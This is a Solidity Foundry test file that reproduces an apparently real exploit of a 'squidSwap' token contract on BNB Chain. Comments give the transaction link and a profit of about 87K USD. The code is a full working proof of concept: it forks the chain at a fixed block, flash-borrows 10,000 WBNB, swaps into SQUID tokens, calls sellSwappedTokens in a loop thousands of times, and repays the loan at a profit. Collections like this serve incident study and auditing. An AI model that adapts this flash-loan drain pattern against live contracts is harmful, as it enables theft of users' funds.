// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// TX : https://app.blocksec.com/explorer/tx/bsc/0x9fcf38d0af4dd08f4d60f7658b623e35664e74bca0eaebdb0c3b9a6965d6257b
// GUY : https://twitter.com/bbbb/status/1777228277415039304
// GUY : https://twitter.com/0xNickLFranklin/status/1777235767577964980
// Profit : ~87K USD
// REASON : Sandwitch attack

interface IsquidSwap{
    function swapTokens(uint256 amount) external;
    function sellSwappedTokens(uint256 sellOption) external;
}

contract ContractTest is Test {
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 SQUID_1 = IERC20(0x87230146E138d3F296a9a77e497A2A83012e9Bc5);
    IERC20 SQUID_2 = IERC20(0xFAfb7581a65A1f554616Bf780fC8a8aCd2Ab8c9b);
    IsquidSwap SQUID_SWAP = IsquidSwap(0xd309f0Fd5C3b90ecFb7024eDe7D329d9582492c5);
    Uni_Pair_V3 pool = Uni_Pair_V3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    Uni_Pair_V2 wbnb_atm = Uni_Pair_V2(0xAea45F6d5801Fc716C654872Eb1E2235472A18B9); 
    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    uint256 borrow_amount;
    function setUp() external 
    {
        cheats.createSelectFork("bsc", 37672969);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker WBNB before exploit", WBNB.balanceOf(address(this)), 18);
        borrow_amount = 10000 ether;
        pool.flash(address(this),0,borrow_amount,"");
        emit log_named_decimal_uint("[End] Attacker WBNB after exploit", WBNB.balanceOf(address(this)), 18);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, /*fee1*/ bytes memory /*data*/ ) public {
        swap_token_to_token(address(WBNB),address(SQUID_1),7000 ether);
        SQUID_1.approve(address(SQUID_SWAP),SQUID_1.balanceOf(address(this)));
        SQUID_SWAP.swapTokens(SQUID_1.balanceOf(address(this)));
        swap_token_to_token(address(WBNB),address(SQUID_2),3000 ether);
        uint256 i = 0;
        uint256 j = 0;
        while(i < 8000){
            try SQUID_SWAP.sellSwappedTokens(0){} catch {break;}
            i ++;
        }

        while(j < 4){
            swap_token_to_token(address(SQUID_2),address(WBNB),SQUID_2.balanceOf(address(this)));
            swap_token_to_token(address(WBNB),address(SQUID_1),7000 ether);
            SQUID_1.approve(address(SQUID_SWAP),SQUID_1.balanceOf(address(this)));
            SQUID_SWAP.swapTokens(SQUID_1.balanceOf(address(this)));
            swap_token_to_token(address(WBNB),address(SQUID_2),3000 ether);
            while(i < 8000){
                try SQUID_SWAP.sellSwappedTokens(0){} catch {break;}
                i ++;
            }
            j ++;
        }
        swap_token_to_token(address(SQUID_2),address(WBNB),SQUID_2.balanceOf(address(this)));
        WBNB.transfer(address(pool),borrow_amount + fee1);
    }

    function swap_token_to_token(address a,address b,uint256 amount) internal {
        IERC20(a).approve(address(router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }

}

